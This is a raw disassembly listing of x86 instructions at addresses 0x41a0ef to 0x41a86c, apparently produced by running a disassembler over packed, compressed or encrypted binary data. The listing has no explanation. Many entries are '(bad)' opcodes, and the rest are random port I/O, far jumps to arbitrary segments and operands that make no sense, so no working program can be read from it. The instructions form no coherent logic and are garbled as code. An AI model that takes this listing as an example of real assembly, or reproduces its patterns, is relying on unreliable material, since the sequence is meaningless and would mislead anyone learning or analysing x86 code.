  41a0ef:	(bad)  
  41a0f0:	cmp    esi,DWORD PTR [eax+edx*2+0x0]
  41a0f4:	jnp    0x41a094
  41a0f6:	jnp    0x41a0ce
  41a0f8:	jecxz  0x41a138
  41a0fa:	or     al,0xfe
  41a0fc:	jo     0x41a16f
  41a0fe:	pop    es
  41a0ff:	or     DWORD PTR [esp+edx*1-0x199d76c8],0x8dfaeaa2
  41a10a:	aaa    
  41a10b:	pop    ecx
  41a10c:	or     bl,BYTE PTR [edx+ebx*4]
  41a10f:	scas   al,BYTE PTR es:[edi]
  41a110:	sbb    DWORD PTR [eax-0x76c9489f],0xffffffda
  41a117:	out    0x6d,al
  41a119:	in     al,dx
  41a11a:	or     ah,ah
  41a11c:	shr    BYTE PTR [ebp+0x43],0xd8
  41a120:	test   DWORD PTR [ecx],eax
  41a122:	imul   ebp,DWORD PTR [edx],0xff087e2e
  41a128:	mov    esp,0x621cb251
  41a12d:	xchg   BYTE PTR [edi],bh
  41a12f:	pop    ecx
  41a130:	xchg   esp,eax
  41a131:	lods   al,BYTE PTR ds:[esi]
  41a132:	and    DWORD PTR es:[edi+0x7],ebx
  41a136:	nop
  41a137:	f2xm1  
  41a139:	sub    cl,BYTE PTR [ebx]
  41a13b:	mov    ebx,DWORD PTR [ecx+0x9]
  41a13e:	mov    fs,WORD PTR [esi]
  41a140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a141:	sub    esi,DWORD PTR [edx]
  41a143:	iret   
  41a144:	xchg   esi,eax
  41a145:	test   eax,0x53f1fdc4
  41a14a:	dec    eax
  41a14b:	sub    BYTE PTR [edi-0x17],bh
  41a14e:	data16 mov ds:0x1b42e2bb,al
  41a154:	stos   BYTE PTR es:[edi],al
  41a155:	into   
  41a156:	inc    edi
  41a157:	ret    0x7eab
  41a15a:	inc    edi
  41a15b:	jo     0x41a1c0
  41a15d:	or     dh,dl
  41a15f:	pop    ds
  41a160:	cmp    esi,DWORD PTR [edx-0x46]
  41a163:	lock dec ebp
  41a165:	jle    0x41a1c4
  41a167:	mov    DWORD PTR [eax-0xc1b000b],edi
  41a16d:	mov    edi,DWORD PTR [edx]
  41a16f:	jb     0x41a1bf
  41a171:	or     dh,BYTE PTR [eax-0x36efaa99]
  41a177:	fist   DWORD PTR [edi+0x62]
  41a17a:	xor    bh,dh
  41a17c:	mov    ds:0xadee185d,eax
  41a181:	arpl   WORD PTR [edx-0x6e5d0a06],bp
  41a187:	adc    BYTE PTR [edx-0x4d],dl
  41a18a:	les    eax,FWORD PTR [ecx-0x1bda2be6]
  41a190:	fld    QWORD PTR [ebp-0xf]
  41a193:	mov    edx,ebp
  41a195:	xor    bh,ch
  41a197:	push   eax
  41a198:	popf   
  41a199:	je     0x41a1a4
  41a19b:	outs   dx,DWORD PTR ds:[esi]
  41a19c:	retf   0xb5d5
  41a19f:	sbb    BYTE PTR [eax],ch
  41a1a1:	push   0x30
  41a1a3:	cmc    
  41a1a4:	jle    0x41a1f4
  41a1a6:	das    
  41a1a7:	retf   
  41a1a8:	in     eax,dx
  41a1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1aa:	bndstx [eax],bnd0
  41a1ad:	add    eax,DWORD PTR [esi+0x77e66835]
  41a1b3:	(bad)  
  41a1b4:	(bad)  
  41a1b5:	clc    
  41a1b6:	repnz arpl WORD PTR [eax-0x2264c3b3],bp
  41a1bd:	(bad)  
  41a1be:	(bad)  
  41a1bf:	jb     0x41a20e
  41a1c1:	cmp    BYTE PTR ds:0xd3f592d7,ah
  41a1c7:	shr    BYTE PTR [edi-0x533d6091],0xed
  41a1ce:	lods   al,BYTE PTR ds:[esi]
  41a1cf:	or     eax,0x6a546506
  41a1d4:	jne    0x41a232
  41a1d6:	mov    esp,0x523e3432
  41a1db:	mov    dh,0xe6
  41a1dd:	test   DWORD PTR [edi],ebx
  41a1df:	fisubr DWORD PTR [edi-0x64811e74]
  41a1e5:	or     BYTE PTR [ecx],dh
  41a1e7:	push   esp
  41a1e8:	pushf  
  41a1e9:	xchg   ah,cl
  41a1eb:	pop    ebx
  41a1ec:	sbb    eax,0x2e3a95be
  41a1f1:	or     bl,BYTE PTR [edi+0x731cd5d9]
  41a1f7:	ja     0x41a204
  41a1f9:	rcr    eax,cl
  41a1fb:	xor    al,cl
  41a1fd:	adc    DWORD PTR [edx-0x40],0x6b
  41a201:	mov    esp,0x37b9db7b
  41a206:	lock sub eax,0x28e2ed52
  41a20c:	mov    ebx,?
  41a20e:	rol    BYTE PTR [esi-0x5a0196b8],0x33
  41a215:	in     eax,dx
  41a216:	enter  0xc794,0x26
  41a21a:	and    ebx,DWORD PTR [eax]
  41a21c:	fisttp WORD PTR [esi-0x55136915]
  41a222:	repz cwde 
  41a224:	sbb    al,0x67
  41a226:	aad    0xb1
  41a228:	js     0x41a1ad
  41a22a:	jbe    0x41a1b0
  41a22c:	adc    bl,BYTE PTR [ecx+0x2a]
  41a22f:	out    0x42,al
  41a231:	cmc    
  41a232:	into   
  41a233:	sub    esi,eax
  41a235:	hlt    
  41a236:	out    0x87,eax
  41a238:	pop    ds
  41a239:	in     al,dx
  41a23a:	mov    cl,0x46
  41a23c:	bound  eax,QWORD PTR [edi-0x25]
  41a23f:	pop    ds
  41a240:	mov    ch,0x35
  41a242:	inc    ebx
  41a243:	mov    eax,ds:0xc94f5f3
  41a248:	and    DWORD PTR [eax+0x738397bc],ecx
  41a24e:	or     ebx,ebx
  41a250:	xchg   ecx,eax
  41a251:	es pop eax
  41a253:	in     al,0x61
  41a255:	inc    eax
  41a256:	add    DWORD PTR [edx+0x0],esp
  41a259:	adc    dl,BYTE PTR [edx+edx*8]
  41a25c:	mov    bh,0x67
  41a25e:	(bad)  
  41a25f:	mov    ebp,0x84f9d624
  41a264:	mov    edx,0x45a748bf
  41a269:	sub    bl,BYTE PTR [edx+0x52ca4117]
  41a26f:	cmp    esi,esp
  41a271:	or     DWORD PTR [edi],esi
  41a273:	ins    DWORD PTR es:[edi],dx
  41a274:	mov    edx,0x4f4cc9aa
  41a279:	xor    al,0xa3
  41a27b:	in     al,0xbb
  41a27d:	inc    edx
  41a27e:	call   0x88d4:0x8c852fd3
  41a285:	jns    0x41a2fc
  41a287:	retf   0x7832
  41a28a:	sub    dh,BYTE PTR [esi+eax*1-0x270e8742]
  41a291:	mov    cl,0x75
  41a293:	mov    ebx,DWORD PTR [ebp+0x4c]
  41a296:	das    
  41a297:	inc    ecx
  41a298:	add    eax,0x755a374b
  41a29d:	test   BYTE PTR [ebp+0x1e],0xee
  41a2a1:	test   eax,0xccbee087
  41a2a6:	mov    ds,WORD PTR [esi-0x70039ad9]
  41a2ac:	mov    ch,0x34
  41a2ae:	xor    BYTE PTR [esi],0xd9
  41a2b1:	int3   
  41a2b2:	cmovg  edx,DWORD PTR [eax]
  41a2b5:	xlat   BYTE PTR ds:[ebx]
  41a2b7:	inc    esp
  41a2b8:	lods   eax,DWORD PTR ds:[esi]
  41a2b9:	xchg   edx,eax
  41a2ba:	in     eax,dx
  41a2bb:	xchg   DWORD PTR [ebx+0x10],ebx
  41a2be:	aaa    
  41a2bf:	fldenv [ecx+ebp*1]
  41a2c2:	in     eax,dx
  41a2c3:	out    dx,al
  41a2c4:	xchg   ebp,eax
  41a2c5:	cli    
  41a2c6:	sti    
  41a2c7:	pop    edi
  41a2c8:	pushf  
  41a2c9:	mov    ecx,0x9c709cf0
  41a2ce:	sub    ebx,eax
  41a2d0:	outs   dx,BYTE PTR ds:[esi]
  41a2d1:	lock jl 0x41a308
  41a2d4:	add    al,0x46
  41a2d6:	add    eax,0x437358ee
  41a2db:	sbb    al,0x93
  41a2dd:	dec    eax
  41a2de:	jecxz  0x41a34c
  41a2e0:	aas    
  41a2e1:	xchg   ebx,eax
  41a2e2:	test   BYTE PTR [esi+eax*8],0xaf
  41a2e6:	dec    ebx
  41a2e7:	jle    0x41a361
  41a2e9:	sub    bl,BYTE PTR [eax]
  41a2eb:	imul   ebx,esp,0xffffffdc
  41a2ee:	sti    
  41a2ef:	fs std 
  41a2f1:	test   al,0x47
  41a2f3:	popf   
  41a2f4:	jb     0x41a315
  41a2f6:	xchg   esp,eax
  41a2f7:	mov    cl,0x43
  41a2f9:	mov    ebx,DWORD PTR [ecx]
  41a2fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2fc:	jecxz  0x41a349
  41a2fe:	mov    bh,BYTE PTR [edx]
  41a300:	pop    ds
  41a301:	cmc    
  41a302:	inc    edi
  41a303:	add    eax,edx
  41a305:	mov    al,0xd8
  41a307:	call   FWORD PTR [edi-0x69b9d094]
  41a30d:	fnstsw WORD PTR gs:[esp+esi*4+0x7b]
  41a312:	neg    ah
  41a314:	jbe    0x41a32e
  41a316:	leave  
  41a317:	mov    ch,0x59
  41a319:	aaa    
  41a31a:	xchg   ecx,eax
  41a31b:	(bad)  
  41a31c:	sti    
  41a31d:	lds    ecx,FWORD PTR [esi]
  41a31f:	imul   edi,eax,0xde7b1c7a
  41a325:	cmp    eax,0xf2026021
  41a32a:	mov    ch,0x2c
  41a32c:	push   0x9e17354d
  41a331:	sub    bh,BYTE PTR [esi]
  41a333:	stos   BYTE PTR es:[edi],al
  41a334:	add    ah,BYTE PTR [edx]
  41a336:	mov    al,ds:0xc016ef9d
  41a33b:	ss dec edx
  41a33d:	sahf   
  41a33e:	push   esi
  41a33f:	inc    eax
  41a340:	enter  0x77fa,0xcf
  41a344:	and    BYTE PTR [edx-0x62d8e3e2],bl
  41a34a:	cmp    edi,edx
  41a34c:	sub    eax,0x690d922d
  41a351:	les    ebx,FWORD PTR [edi+0x61]
  41a354:	jo     0x41a2d6
  41a356:	out    0x4e,al
  41a358:	popa   
  41a359:	or     eax,0x913729e5
  41a35e:	nop
  41a35f:	outs   dx,BYTE PTR ds:[esi]
  41a360:	inc    ebx
  41a361:	shr    DWORD PTR [esi],0x7c
  41a364:	xor    al,BYTE PTR [edx+0x6654c264]
  41a36a:	lods   eax,DWORD PTR ds:[esi]
  41a36b:	jb     0x41a3b5
  41a36d:	sbb    BYTE PTR [edi+eax*2+0x5ce791bb],dh
  41a374:	test   al,0x6a
  41a376:	pop    edx
  41a377:	sub    BYTE PTR [ebp-0x53f909fc],ah
  41a37d:	jno    0x41a303
  41a37f:	sbb    ah,al
  41a381:	or     eax,DWORD PTR ds:0x7fdbaac4
  41a387:	push   esp
  41a388:	repnz test eax,0x29f16eab
  41a38e:	push   eax
  41a38f:	iret   
  41a390:	test   eax,0xa900f3ff
  41a395:	fldcw  WORD PTR [eax]
  41a397:	mov    eax,esi
  41a399:	mov    eax,ds:0xa9c4ed54
  41a39e:	jge    0x41a402
  41a3a0:	sbb    DWORD PTR [ecx],ebp
  41a3a2:	mov    BYTE PTR [esi-0x75],bh
  41a3a5:	test   eax,0xc133fcdd
  41a3aa:	lock into 
  41a3ac:	and    edx,DWORD PTR [esi+0x66]
  41a3af:	test   BYTE PTR [eax-0x2e02a61a],cl
  41a3b5:	into   
  41a3b6:	cmp    DWORD PTR [ebp-0x50caa00f],edx
  41a3bc:	and    esi,esi
  41a3be:	aaa    
  41a3bf:	mov    WORD PTR [ebx-0x4f4d8e74],es
  41a3c5:	mov    dl,0xae
  41a3c7:	sub    edi,ecx
  41a3c9:	inc    ebp
  41a3ca:	sbb    BYTE PTR [ebx+0x32],al
  41a3cd:	test   DWORD PTR [edi+0x43c5a9e8],eax
  41a3d3:	in     al,0x6c
  41a3d5:	dec    ebx
  41a3d6:	sbb    eax,0x39c41d49
  41a3db:	mov    ss,WORD PTR [edi+ebp*8+0x61]
  41a3df:	inc    eax
  41a3e0:	inc    ebx
  41a3e1:	stc    
  41a3e2:	test   eax,0x6201cbe7
  41a3e7:	out    0x20,eax
  41a3e9:	xchg   edi,eax
  41a3ea:	mov    al,0x39
  41a3ec:	enter  0x3c2d,0xba
  41a3f0:	fcom   DWORD PTR [ebx+0x7a71dbb]
  41a3f6:	push   esp
  41a3f7:	gs iret 
  41a3f9:	loopne 0x41a3a5
  41a3fb:	mov    ch,0xae
  41a3fd:	in     eax,dx
  41a3fe:	cld    
  41a3ff:	sub    BYTE PTR cs:[edi+ebx*2-0x14294818],ah
  41a407:	jecxz  0x41a418
  41a409:	jmp    0x18da5333
  41a40e:	and    BYTE PTR [ecx+0x34],ch
  41a411:	xchg   ebp,eax
  41a412:	jge    0x41a3ed
  41a414:	xchg   esp,eax
  41a415:	jnp    0x41a3e2
  41a417:	xor    cl,0x76
  41a41a:	retf   0xc084
  41a41d:	out    dx,eax
  41a41e:	bound  edx,QWORD PTR [ebp+esi*8-0x36d33a3b]
  41a425:	inc    ebx
  41a426:	imul   ebp,DWORD PTR [ebx+0x3a],0x5e022d1d
  41a42d:	xchg   esi,eax
  41a42e:	lds    edi,FWORD PTR [ebx+0x8]
  41a431:	jo     0x41a409
  41a433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a434:	sbb    dl,BYTE PTR [ebx+ebp*4]
  41a437:	loop   0x41a3d2
  41a439:	fild   WORD PTR [edx+0x6b]
  41a43c:	repz sbb DWORD PTR [esi-0x47],ebx
  41a440:	mov    bl,0xcd
  41a442:	and    al,0xc0
  41a444:	les    esi,FWORD PTR [ecx+0x4d64c3ed]
  41a44a:	adc    dl,BYTE PTR ds:0x1d5bc605
  41a450:	pop    edx
  41a451:	xchg   esp,eax
  41a452:	mov    edx,0x258330ca
  41a457:	(bad)  
  41a458:	scas   al,BYTE PTR es:[edi]
  41a459:	cmp    dl,dl
  41a45b:	and    al,0x4c
  41a45d:	jmp    0x88c4:0x7479bb03
  41a464:	into   
  41a465:	push   ss
  41a466:	mov    ah,0x8d
  41a468:	ret    0x2508
  41a46b:	and    BYTE PTR [edx+0xc],0x55
  41a46f:	(bad)  
  41a470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a471:	sub    al,0xbf
  41a473:	stc    
  41a474:	adc    dh,BYTE PTR [edi-0x64]
  41a477:	mov    bl,0xe7
  41a479:	es cdq 
  41a47b:	and    eax,0xcdee3278
  41a480:	mov    cl,0x7f
  41a482:	stos   DWORD PTR es:[edi],eax
  41a483:	cmp    eax,0x12b2d7ee
  41a488:	jne    0x41a469
  41a48a:	(bad)  
  41a48b:	gs xor eax,esi
  41a48e:	popa   
  41a48f:	loope  0x41a4a5
  41a491:	outs   dx,DWORD PTR ds:[esi]
  41a492:	jle    0x41a4c8
  41a494:	mov    cl,0xfc
  41a496:	pmuludq mm7,QWORD PTR [ebp+eax*8+0xc0f1a07]
  41a49e:	jge    0x41a515
  41a4a0:	or     edi,ecx
  41a4a2:	inc    ebp
  41a4a3:	pop    esi
  41a4a4:	adc    al,0xc
  41a4a6:	fist   DWORD PTR [esi-0x27]
  41a4a9:	ss pop esi
  41a4ab:	mov    BYTE PTR ds:0x7f018528,bl
  41a4b1:	and    eax,0xb4212d55
  41a4b6:	dec    esi
  41a4b7:	adc    ebx,DWORD PTR [eax]
  41a4b9:	loopne 0x41a492
  41a4bb:	and    al,0x7c
  41a4bd:	mov    ds:0x53f3915d,eax
  41a4c2:	div    DWORD PTR [esi-0x9]
  41a4c5:	xor    DWORD PTR [eax+0x11718764],eax
  41a4cb:	or     DWORD PTR [ecx+0x35],esi
  41a4ce:	cmp    ecx,DWORD PTR [esi+0x3a3ac4f0]
  41a4d4:	sub    ebp,DWORD PTR [eax+0x7]
  41a4d7:	mov    ah,0xd6
  41a4d9:	inc    edi
  41a4da:	aad    0x87
  41a4dc:	fnstcw WORD PTR [eax-0x2e74474f]
  41a4e2:	pusha  
  41a4e3:	hlt    
  41a4e4:	imul   edx,DWORD PTR [eax+ebp*8+0x77],0xffffffcb
  41a4e9:	push   ebp
  41a4ea:	enter  0x2e7a,0xa3
  41a4ee:	sub    eax,0xc5b77c69
  41a4f3:	mov    ds:0x218aefb1,eax
  41a4f8:	mov    WORD PTR [ebp+0x60],gs
  41a4fb:	int    0x68
  41a4fd:	retf   
  41a4fe:	aam    0x67
  41a500:	adc    ah,BYTE PTR es:[edx+ebp*2+0x240a64b2]
  41a508:	xor    esp,esi
  41a50a:	shl    BYTE PTR cs:[ecx+0x2072412],cl
  41a511:	add    DWORD PTR [ebx+0x64a03315],ecx
  41a517:	and    esi,0x1a
  41a51a:	repnz xor esi,DWORD PTR [eax+0x5a]
  41a51e:	in     al,dx
  41a51f:	loope  0x41a4dd
  41a521:	jge    0x41a4f0
  41a523:	or     al,0xbc
  41a525:	rcl    BYTE PTR [ecx+0x41],1
  41a528:	mov    eax,ds:0x9f157414
  41a52d:	jns    0x41a551
  41a52f:	in     al,0xb4
  41a531:	adc    al,0xe6
  41a533:	shld   DWORD PTR ds:0x1e4633fa,ecx,cl
  41a53a:	and    eax,0xabb890e6
  41a53f:	mov    edx,0x9886f37f
  41a544:	mov    al,ds:0x57147e56
  41a549:	rcl    ch,0xcb
  41a54c:	(bad)  
  41a54d:	fbld   TBYTE PTR [ecx]
  41a54f:	xchg   esi,eax
  41a550:	xor    al,0xe7
  41a552:	cmp    al,0x46
  41a554:	pop    edi
  41a555:	mov    ch,0x18
  41a557:	pop    edx
  41a558:	sub    ecx,eax
  41a55a:	push   edx
  41a55b:	in     eax,dx
  41a55c:	jmp    0x41a4f4
  41a55e:	pop    eax
  41a55f:	jmp    0x4ffa7e5d
  41a564:	cli    
  41a565:	aaa    
  41a566:	mov    ebp,0xca26b96a
  41a56b:	scas   eax,DWORD PTR es:[edi]
  41a56c:	bound  ebx,QWORD PTR [ebx-0x1]
  41a56f:	push   edx
  41a570:	call   0xfd8c:0x9d2351fa
  41a577:	push   esi
  41a578:	or     BYTE PTR [eax],bh
  41a57a:	inc    esp
  41a57b:	pop    edi
  41a57c:	push   ebp
  41a57d:	sti    
  41a57e:	pop    ss
  41a57f:	or     eax,0xf30a5994
  41a584:	xchg   BYTE PTR [esi+edi*8+0x56],ah
  41a588:	jbe    0x41a5a9
  41a58a:	int    0x6d
  41a58c:	dec    esi
  41a58d:	out    dx,al
  41a58e:	(bad)  
  41a58f:	std    
  41a590:	add    dl,BYTE PTR ds:0xa6bd523c
  41a596:	xor    bh,BYTE PTR [ebp+edi*2-0x46]
  41a59a:	cmp    bh,BYTE PTR [ebx-0x7b]
  41a59d:	inc    ecx
  41a59e:	push   0xffffff90
  41a5a0:	loope  0x41a54a
  41a5a2:	call   0xba19:0x1ce5a6a7
  41a5a9:	pushf  
  41a5aa:	loope  0x41a591
  41a5ac:	popa   
  41a5ad:	or     eax,0x41097b95
  41a5b2:	pop    ss
  41a5b3:	daa    
  41a5b4:	and    cl,BYTE PTR [eax+ebp*8]
  41a5b7:	call   0x9217:0x96c0fe28
  41a5be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5bf:	cmp    ebp,DWORD PTR [ecx-0x62]
  41a5c2:	mov    eax,ds:0x8831e9ac
  41a5c7:	mov    es:0xbc213687,al
  41a5cd:	pavgw  mm6,QWORD PTR [edi-0x66969e30]
  41a5d4:	adc    BYTE PTR [ecx],ah
  41a5d6:	mov    ebp,0xfef4170
  41a5db:	(bad)  
  41a5dc:	mov    ch,0x69
  41a5de:	adc    eax,0x2d32bcba
  41a5e3:	xchg   esi,eax
  41a5e4:	ja     0x41a57d
  41a5e6:	xchg   esp,eax
  41a5e7:	cdq    
  41a5e8:	dec    edx
  41a5e9:	aas    
  41a5ea:	test   DWORD PTR [ecx-0x50],esp
  41a5ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5ee:	mov    edx,0xc9eeefa4
  41a5f3:	popa   
  41a5f4:	cmp    dl,al
  41a5f6:	ins    DWORD PTR es:[edi],dx
  41a5f7:	xor    al,0x79
  41a5f9:	fs pop ds
  41a5fb:	aas    
  41a5fc:	stos   DWORD PTR es:[edi],eax
  41a5fd:	scas   eax,DWORD PTR es:[edi]
  41a5fe:	sub    eax,0x259cff2f
  41a603:	fadd   QWORD PTR [eax-0x56]
  41a606:	rol    cl,cl
  41a608:	(bad)  
  41a609:	push   ecx
  41a60a:	mov    cl,0xea
  41a60c:	xchg   DWORD PTR [ebx+0x24bbecd6],edx
  41a612:	xchg   edi,eax
  41a613:	pop    ecx
  41a614:	mov    ebx,0xdf79dfa3
  41a619:	and    al,dh
  41a61b:	pushf  
  41a61c:	ror    dh,cl
  41a61e:	stos   DWORD PTR es:[edi],eax
  41a61f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a620:	cmp    bl,BYTE PTR [eax-0x975dc01]
  41a626:	dec    eax
  41a627:	arpl   bx,di
  41a629:	push   DWORD PTR [esi-0x9]
  41a62c:	bnd ret 0xee70
  41a630:	ins    DWORD PTR es:[edi],dx
  41a631:	arpl   WORD PTR [edx-0x623d3315],si
  41a637:	out    0xcc,eax
  41a639:	popa   
  41a63a:	arpl   WORD PTR [edi+0x204e7238],di
  41a640:	push   es
  41a641:	push   ss
  41a642:	mov    ds:0x7b685469,al
  41a647:	cli    
  41a648:	(bad)  
  41a649:	jns    0x41a6c3
  41a64b:	or     BYTE PTR [esi-0x5aaa9be4],bh
  41a651:	leave  
  41a652:	daa    
  41a653:	push   eax
  41a654:	jno    0x41a675
  41a656:	mov    BYTE PTR [eax+0x4c],al
  41a659:	mov    ?,WORD PTR [ebx-0x4c]
  41a65c:	jo     0x41a5f2
  41a65e:	dec    edx
  41a65f:	sub    eax,0x708adad5
  41a664:	and    esi,DWORD PTR [ebx]
  41a666:	mov    al,0x8b
  41a668:	shl    BYTE PTR [ecx+ecx*8+0x6ce7ab43],cl
  41a66f:	jge    0x41a6c8
  41a671:	pop    esp
  41a672:	stos   BYTE PTR es:[di],al
  41a674:	xor    al,al
  41a676:	mov    al,ds:0x33b497a2
  41a67b:	push   ebx
  41a67c:	add    al,0x96
  41a67e:	xchg   ebx,eax
  41a67f:	mov    fs,ecx
  41a681:	fwait
  41a682:	rcr    BYTE PTR [eax*4-0x297eba82],0x99
  41a68a:	cli    
  41a68b:	out    dx,al
  41a68c:	test   al,0x8f
  41a68e:	add    ch,BYTE PTR [edx]
  41a690:	(bad)  
  41a691:	lock add BYTE PTR [esi-0x4b48b8d7],0x2d
  41a699:	ins    DWORD PTR es:[edi],dx
  41a69a:	dec    esp
  41a69b:	cmp    eax,0x85e356af
  41a6a0:	sub    ebx,DWORD PTR [edi]
  41a6a2:	mov    dh,0xf8
  41a6a4:	(bad)  
  41a6a5:	cwde   
  41a6a6:	out    dx,eax
  41a6a7:	aad    0x68
  41a6a9:	stos   DWORD PTR es:[edi],eax
  41a6aa:	shl    BYTE PTR [ecx],cl
  41a6ac:	mov    eax,0x26f3773d
  41a6b1:	dec    eax
  41a6b2:	(bad)  
  41a6b3:	pusha  
  41a6b4:	mov    ebp,0xb316c70d
  41a6b9:	and    dl,BYTE PTR [edx+0x67780964]
  41a6bf:	in     eax,0x7e
  41a6c1:	dec    esi
  41a6c2:	enter  0x41b5,0xac
  41a6c6:	xchg   ecx,eax
  41a6c7:	aas    
  41a6c8:	lods   al,BYTE PTR ds:[esi]
  41a6c9:	retf   
  41a6ca:	adc    eax,DWORD PTR [ecx]
  41a6cc:	push   0xea655b8c
  41a6d1:	(bad)  
  41a6d2:	push   ebx
  41a6d3:	push   cs
  41a6d4:	cmc    
  41a6d5:	or     al,0xa5
  41a6d7:	imul   esp,DWORD PTR [edx-0x5b55bf32],0x4f
  41a6de:	mov    eax,0x78e248de
  41a6e3:	add    al,0x90
  41a6e5:	out    0x56,eax
  41a6e7:	dec    esp
  41a6e8:	pop    di
  41a6ea:	loopne 0x41a68d
  41a6ec:	ins    DWORD PTR es:[edi],dx
  41a6ed:	lods   al,BYTE PTR ds:[esi]
  41a6ee:	sbb    eax,0x401fffb7
  41a6f3:	repnz bnd jo 0x41a6ca
  41a6f7:	test   BYTE PTR [esi+0x766abf72],0xd4
  41a6fe:	and    bh,ch
  41a700:	sub    ch,bl
  41a702:	out    0xa9,eax
  41a704:	cmc    
  41a705:	inc    edx
  41a706:	jp     0x41a70b
  41a708:	jle    0x41a69b
  41a70a:	bound  ebx,QWORD PTR [ebx+0x7bc4f8d]
  41a710:	inc    ebx
  41a711:	lds    edi,FWORD PTR [esi]
  41a713:	mov    bl,0x54
  41a715:	cmp    BYTE PTR [ebp-0x7c38bcac],bl
  41a71b:	int3   
  41a71c:	sti    
  41a71d:	push   edi
  41a71e:	or     al,0xfd
  41a720:	add    DWORD PTR [ecx+0x3c],edi
  41a723:	sub    dh,BYTE PTR [ebp+0x4ab1090d]
  41a729:	xor    edx,DWORD PTR [esi+0x3b2630ab]
  41a72f:	loope  0x41a7a6
  41a731:	aas    
  41a732:	xchg   ecx,eax
  41a733:	push   ebp
  41a734:	pop    edi
  41a735:	int    0xdc
  41a737:	xor    al,0x23
  41a739:	in     eax,0xd1
  41a73b:	scas   eax,DWORD PTR es:[edi]
  41a73c:	xchg   esi,eax
  41a73d:	(bad)  
  41a73e:	cli    
  41a73f:	sar    DWORD PTR [edx-0x38004182],1
  41a745:	add    BYTE PTR [eax],0x4f
  41a748:	fwait
  41a749:	push   edx
  41a74a:	ret    0x76d2
  41a74d:	sbb    eax,DWORD PTR [eax-0x1aec44c5]
  41a753:	mov    bh,0x8a
  41a755:	out    0xde,eax
  41a757:	push   ds
  41a758:	test   eax,0x23e5254c
  41a75d:	je     0x41a706
  41a75f:	inc    esi
  41a760:	jge    0x41a702
  41a762:	or     edi,DWORD PTR [ecx]
  41a764:	ficomp WORD PTR [ebx+0x5477b62]
  41a76a:	scas   eax,DWORD PTR es:[edi]
  41a76b:	dec    ebp
  41a76c:	cld    
  41a76d:	stos   DWORD PTR es:[edi],eax
  41a76e:	xor    eax,0x4de51396
  41a773:	jge    0x41a73e
  41a775:	inc    esi
  41a776:	mov    BYTE PTR [bp-0x3244],cl
  41a77b:	into   
  41a77c:	jne    0x41a7f8
  41a77e:	mov    ds,ecx
  41a780:	nop
  41a781:	pushf  
  41a782:	jp     0x41a7e3
  41a784:	ss daa 
  41a786:	and    DWORD PTR [eax-0x7538402a],0xb92ba227
  41a790:	fsqrt  
  41a792:	(bad)  
  41a793:	int    0xe5
  41a795:	scas   al,BYTE PTR es:[edi]
  41a796:	icebp  
  41a797:	sub    al,0x74
  41a799:	daa    
  41a79a:	add    dh,BYTE PTR [edx]
  41a79c:	leave  
  41a79d:	lods   eax,DWORD PTR ds:[esi]
  41a79e:	and    BYTE PTR [esi],dl
  41a7a0:	sti    
  41a7a1:	(bad)  
  41a7a2:	lds    ebp,FWORD PTR [ecx]
  41a7a4:	jno    0x41a78c
  41a7a6:	and    esi,DWORD PTR [eax]
  41a7a8:	jmp    0xae1:0x1a7295d7
  41a7af:	js     0x41a786
  41a7b1:	in     al,dx
  41a7b2:	sub    edx,ecx
  41a7b4:	lods   eax,DWORD PTR ds:[esi]
  41a7b5:	loop   0x41a764
  41a7b7:	push   ds
  41a7b8:	sahf   
  41a7b9:	out    0x88,al
  41a7bb:	push   es
  41a7bc:	sub    DWORD PTR [esi+0x78],ebx
  41a7bf:	shr    DWORD PTR [eax+0x2169c0c5],1
  41a7c5:	lock mov ah,0xd3
  41a7c8:	adc    DWORD PTR [ebx+eax*8+0x63],ecx
  41a7cc:	xchg   esi,eax
  41a7cd:	or     al,0x13
  41a7cf:	mov    dl,0x78
  41a7d1:	push   esp
  41a7d2:	in     eax,0x11
  41a7d4:	in     eax,dx
  41a7d5:	mov    cl,0x36
  41a7d7:	mov    ds:0x3d6e8b6d,eax
  41a7dc:	mov    ebx,0xb8fed186
  41a7e1:	mov    al,0xc6
  41a7e3:	inc    edx
  41a7e4:	pusha  
  41a7e5:	lods   al,BYTE PTR ds:[esi]
  41a7e6:	shl    BYTE PTR [ecx],1
  41a7e8:	sbb    BYTE PTR [ebx+0x59],dh
  41a7eb:	(bad)  
  41a7ec:	or     esi,DWORD PTR [esi]
  41a7ee:	retf   0xb7cd
  41a7f1:	fiadd  WORD PTR [eax]
  41a7f3:	out    0x36,eax
  41a7f5:	jnp    0x41a7ff
  41a7f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7f8:	cli    
  41a7f9:	mov    dh,0xad
  41a7fb:	je     0x41a796
  41a7fd:	and    DWORD PTR [edi-0x7113f938],0x3e
  41a804:	xchg   bl,al
  41a806:	es pusha 
  41a808:	inc    eax
  41a809:	jmp    0x6ce9f5b0
  41a80e:	fld    QWORD PTR [edx-0x25b8538d]
  41a814:	jg     0x41a7b6
  41a816:	xchg   ecx,eax
  41a817:	imul   ebp,eax,0xfcd34701
  41a81d:	mov    dl,0xb4
  41a81f:	pop    ecx
  41a820:	cvtps2pi mm6,xmm0
  41a823:	aam    0xd5
  41a825:	inc    ebp
  41a826:	out    0x3b,al
  41a828:	icebp  
  41a829:	rol    ch,cl
  41a82b:	stos   BYTE PTR es:[edi],al
  41a82c:	repz push cs
  41a82e:	enter  0x4e40,0x9a
  41a832:	jmp    0xc43574da
  41a837:	mov    BYTE PTR [eax],al
  41a839:	cwde   
  41a83a:	psrld  mm4,mm3
  41a83d:	xor    al,0x2d
  41a83f:	pop    ss
  41a840:	and    al,0x4a
  41a842:	aas    
  41a843:	mov    ds:0x14dbcbd4,eax
  41a848:	dec    esi
  41a849:	adc    edi,ecx
  41a84b:	inc    eax
  41a84c:	xor    al,0x19
  41a84e:	test   cl,cl
  41a850:	lea    esp,[ecx-0x13]
  41a853:	popa   
  41a854:	and    al,0x32
  41a856:	add    DWORD PTR [ecx-0x4533af28],edx
  41a85c:	data16 jno 0x41a874
  41a85f:	add    al,0xe6
  41a861:	adc    edi,DWORD PTR [ecx+0x26775ccc]
  41a867:	mov    edx,0x23c9f969
  41a86c:	aam    0x82
